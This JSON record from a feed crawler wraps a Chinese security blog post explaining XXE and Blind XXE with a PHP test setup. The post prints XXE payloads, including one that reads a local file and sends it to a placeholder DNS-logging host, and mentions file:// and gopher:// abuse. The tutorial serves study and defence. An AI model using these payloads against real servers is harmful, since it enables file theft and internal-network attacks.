{"code":1,"isDone":false,"toInsertArticleList":[{"createdTime":"2020-10-20 13:02:22","updatedTime":"2020-10-20 13:02:22","title":"当提起Blind XXE时候会想到什么","link":"http://das.scusec.org/2016/08/24/blind-xxe/","description":"<p><img src=\"http://dassec.b0.upaiyun.com/ksss/XXEA.png\" alt=\"\" /></p> \n<p>XXE（XML实体注入漏洞）顾名思义，漏洞的关键点在于服务器对外部实体的解析。外部实体中可以请求他域资源，也许在包括我之内的很多人在漏洞利用时会习惯的把XXE问题转换成SSRF的问题。<br><a id=\"more\"></a></br></p> \n<h2 id=\"0x00\"><a href=\"http://das.scusec.org/2016/08/24/blind-xxe/#0x00\" class=\"headerlink\" title=\"0x00\"></a>0x00</h2>\n<p>前几天别人问我一个有趣的问题：<strong>Blind XXE和普通XXE本质区别是什么。</strong> 仔细想了想，我答不上来，由于类似于cloudeye的使用DNS泛析和URL请求记录是可以查看命令执行结果的，大家通常不会在意漏洞点程序是否预设了回显或者可以使用报错得到回显。所以找了一些资料，记录一下上面问题的答案和也顺便记录一下XXE漏洞形成的原因。</p> \n<h2 id=\"0x01\"><a href=\"http://das.scusec.org/2016/08/24/blind-xxe/#0x01\" class=\"headerlink\" title=\"0x01\"></a>0x01</h2>\n<p>首先要搞清楚的是XML外部实体的概念。一般容易误以为外部是自己定义的意思，事实上外部实体是指实体的参数内容不是当前XML定义的而是从其他资源引入的，用<strong>SYSTEM</strong>和<strong>PUBLIC</strong>来申明，也就是我们常在XXE payload里面看到的样子。<br>\n  <figure class=\"highlight plain\">\n   <table>\n    <tr>\n     <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n     <td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE ANY [\n\n&lt;!ENTITY hello SYSTEM \"http://%xx.xxx.yourcloudeye.xxx/%xx\"&gt;\n\n]&gt;</span><br /></pre></td>\n    </tr>\n   </table>\n  </figure></br></p> \n<p>如果在外界可控的 web代码和xml的交互点 可以插入我们定义的xml实体并被服务器解析，这样就造成了一个XXE漏洞（这句话写了很多遍还是觉得难读通顺，用SQLi类推一下就比较好理解了）。以php为例搭了一个测试环境。</p> \n<p><img src=\"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824092818.png\" alt=\"enter description here\" /></p> \n<p>首先浏览器是可以解析XML的，当然，是没有权限解析外部实体的（不然url链接没人敢点了）。开始在lamp下搭发现的www用户解析外部实体权限也不够，于是在wamp环境给apache sa权限测试。下面是php使用simplexml_load_file解析xml文件代码。</p> \n<figure class=\"highlight php\">\n <table>\n  <tr>\n   <td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n   <td class=\"code\"><pre><span class=\"line\"><span class=\"preprocessor\">&lt;?php</span></span><br><span class=\"line\"><span class=\"keyword\">if</span> (file_exists(<span class=\"string\">'b.xml'</span>)) {</span><br><span class=\"line\">    <span class=\"variable\">$xml</span> = simplexml_load_file(<span class=\"string\">'b.xml'</span>);</span><br><span class=\"line\">    var_dump(<span class=\"variable\">$xml</span>);</span><br><span class=\"line\">    <span class=\"comment\">/*echo($xml-&gt;title);*/</span></span><br><span class=\"line\"> <span class=\"comment\">/*var_dump($xml);*/</span></span><br><span class=\"line\">} <span class=\"keyword\">else</span> {</span><br><span class=\"line\"> <span class=\"keyword\">exit</span>(<span class=\"string\">'Failed to open b.xml.'</span>);</span><br><span class=\"line\">}</span><br><span class=\"line\"><span class=\"preprocessor\">?&gt;</span></span><br /></br></br></br></br></br></br></br></br></br></pre></td>\n  </tr>\n </table>\n</figure> \n<p><img src=\"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094116.png\" alt=\"enter description here\" /></p> \n<p>xxetest.php把b.xml的内容解析后输出一个SimpleXMLElement对象，供其他函数使用xml中各个节点的值。我们可以在平台上看到解析外部实体发送的请求。剩下的利用就比较直观了，在请求资源时使用<a href=\"http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。\" target=\"_blank\" rel=\"external\">http://端口探测或带上内网攻击向量；file://或者php://filter等读取文件；gopher://发送复杂请求等等。</a></p> \n<p><img src=\"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094812.png\" alt=\"enter description here\" /></p> \n<h2 id=\"0x02\"><a href=\"http://das.scusec.org/2016/08/24/blind-xxe/#0x02\" class=\"headerlink\" title=\"0x02\"></a>0x02</h2>\n<p>回到Blind XXE的问题，仔细看b.xml可以发现，在开始定义了hello这个实体后，节点中引入了一个 <strong>&amp;hello；</strong>。如果请求的资源存在，则可以在节点中看到hello的值，这就是有返回的XXE雏形。对b.xml稍作修改，使用file协议读取本地文件，结果如下图。</p> \n<p><img src=\"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824100258.png\" alt=\"enter description here\" /></p> \n<p>所以如果xml文件没有在节点中使用这个实体，或者节点中使用了&amp;hello；而可执行文件没有把值在response中返回的情况就属于Blind XXE。<br>如果进行端口探测等操作可以直接参考SSRF利用时间差来完成，如果要接收回显的话，也可以用实体嵌套来完成。如果xml解析器不支持嵌套定义有可以把gethello内容写在外部xml中再引用进来有时候可以绕过。<br>也有把hello的值作为参数传给自己服务器上的php中然后保存成文件的，原理差不多，但是没有DNS解析平台简洁直观。<br>\n    <figure class=\"highlight plain\">\n     <table>\n      <tr>\n       <td class=\"gutter\"><pre><span class=\"line\">1</span><br /></pre></td>\n       <td class=\"code\"><pre><span class=\"line\">&lt;!DOCTYPE root [  \n&lt;!ENTITY % hello \"file:///c:/1.txt\"&gt;  \n&lt;!ENTITY % gethello \"&lt;!ENTITY % param222 SYSTEM'http://xxx.yourcloudeye.xxx/%hello;'&gt;\"&gt;  \n%gethello;  \n]&gt;</span><br /></pre></td>\n      </tr>\n     </table>\n    </figure></br></br></br></p> \n<h2 id=\"0x03\"><a href=\"http://das.scusec.org/2016/08/24/blind-xxe/#0x03\" class=\"headerlink\" title=\"0x03\"></a>0x03</h2>\n<p>对XXE的总结就差不多到这里了，如果说Blind XXE和XXE有什么本质区别的话，大概是Blind会让有些人说的：“不就是发包看返回的”的扫描器比较头疼吧。<br>之前SSRF文章的坑也准备填上了，2准备把归纳的一些gopher构造方法，一些内网ip限制绕过策略，以及打造自己的SSRF自动化探测脚本三个方面总结一下。<br>最近发现自己关于程序底层和程序优化相关的比较弱，想学习一下，有好的资料请推荐给我嘛~~</br></br></p>","descriptionType":"html","publishedDate":"Tue, 23 Aug 2016 16:00:00 +0000","feedId":39031,"bgimg":"http://dassec.b0.upaiyun.com/ksss/XXEA.png","linkMd5":"409a3316dac8628f0ff6340bc178ad95","sourceBytes":0,"destBytes":0,"author":"","articleImgCdnMap":{"http://dassec.b0.upaiyun.com/ksss/XXEA.png":null,"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824092818.png":null,"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094116.png":null,"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824094812.png":null,"http://www.mauu.me/wp-content/uploads/2016/08/QQ%E6%88%AA%E5%9B%BE20160824100258.png":null},"publishedOrCreatedDate":1603170142349}],"record":{"createdTime":"2020-10-20 13:02:22","updatedTime":"2020-10-20 13:02:22","feedId":39031,"fetchDate":"Tue, 20 Oct 2020 05:02:22 +0000","fetchMs":593,"handleMs":22,"totalMs":125492,"newArticles":0,"totalArticles":20,"status":1,"type":0,"ip":"1bc2e11d54d94d2e8b384096218a63f0","hostName":"us-038*","requestId":"910fa4cd6a674939a85ce44ec29ccf48_39031","contentType":"application/xml","totalBytes":0,"bgimgsTotal":1,"bgimgsGithubTotal":0,"articlesImgsTotal":5,"articlesImgsGithubTotal":0,"successGithubMap":{},"failGithubMap":{}},"feed":{"createdTime":"2020-09-07 03:16:04","updatedTime":"2020-09-07 05:31:41","id":39031,"name":"小黑屋","url":"http://das.scusec.org/atom.xml","subscriber":82,"website":null,"icon":"http://das.scusec.org/favicon.png","icon_jsdelivr":"https://cdn.jsdelivr.net/gh/myreaderx63/cdn21@2020_4/2020/09/06/21-31-37-844_461b3af3bec7732b.png","description":"一群专注安全的小伙们","weekly":null,"link":null},"noPictureArticleList":[{"createdTime":"2020-10-20 13:04:27","updatedTime":"2020-10-20 13:04:27","id":null,"feedId":39031,"linkMd5":"409a3316dac8628f0ff6340bc178ad95"}],"tmpCommonImgCdnBytes":0,"tmpBodyImgCdnBytes":0,"tmpBgImgCdnBytes":0,"extra4":{"start":1603170141726,"total":0,"statList":[{"spend":601,"msg":"获取xml内容"},{"spend":22,"msg":"解释文章"},{"spend":0,"msg":"上传封面图到cdn"},{"spend":0,"msg":"修正封面图上传失败重新上传"},{"spend":123080,"msg":"正文链接上传到cdn"}]},"extra5":5,"extra6":1,"extra7ImgCdnFailResultVector":[{"code":1,"isDone":false,"source":"http://dassec.b0.upaiyun.com/ksss/XXEA.png","sourceStatusCode":405,"sourceBytes":0,"destBytes":0,"feedId":39031,"totalSpendMs":920,"convertSpendMs":0,"createdTime":"2020-10-20 13:02:22","host":"us-031*","referer":"http://das.scusec.org/2016/08/24/blind-xxe/","linkMd5ListStr":"409a3316dac8628f0ff6340bc178ad95,409a3316dac8628f0ff6340bc178ad95","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[405],"sourceSize":"0","destSize":"0"},{"code":1,"isDone":false,"source":"http://dassec.b0.upaiyun.com/ksss/XXEA.png","sourceStatusCode":405,"sourceBytes":0,"destBytes":0,"feedId":39031,"totalSpendMs":836,"convertSpendMs":0,"createdTime":"2020-10-20 13:02:23","host":"us-014*","referer":"http://das.scusec.org/2016/08/24/blind-xxe/","linkMd5ListStr":"409a3316dac8628f0ff6340bc178ad95,409a3316dac8628f0ff6340bc178ad95","extra22GetBytesInfo":"1、没有Referer字段","extra23historyStatusCode":[405],"sourceSize":"0","destSize":"0"},null,null,null,null,null,null,null,null],"extra10_invalidATagHrefValue":{"http://das.scusec.org/2016/08/24/blind-xxe/_#0x02":"http://das.scusec.org/2016/08/24/blind-xxe/#0x02","http://das.scusec.org/2016/08/24/blind-xxe/_#0x01":"http://das.scusec.org/2016/08/24/blind-xxe/#0x01","http://das.scusec.org/2016/08/24/blind-xxe/_#0x00":"http://das.scusec.org/2016/08/24/blind-xxe/#0x00","http://das.scusec.org/2016/08/24/blind-xxe/_#0x03":"http://das.scusec.org/2016/08/24/blind-xxe/#0x03"},"extra111_proxyServerAndStatMap":{"http://us-020.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://us-018.herokuapp.com/":{"failCount":2,"successCount":0,"resultList":[null,null]},"http://europe21.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe62.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]},"http://europe-59.herokuapp.com/":{"failCount":2,"successCount":0,"resultList":[null,null]},"http://us-008.herokuapp.com/":{"failCount":1,"successCount":0,"resultList":[null]}},"extra12ImgCdnSuccessResultVector":[],"successGithubMap":{},"failGithubMap":{}}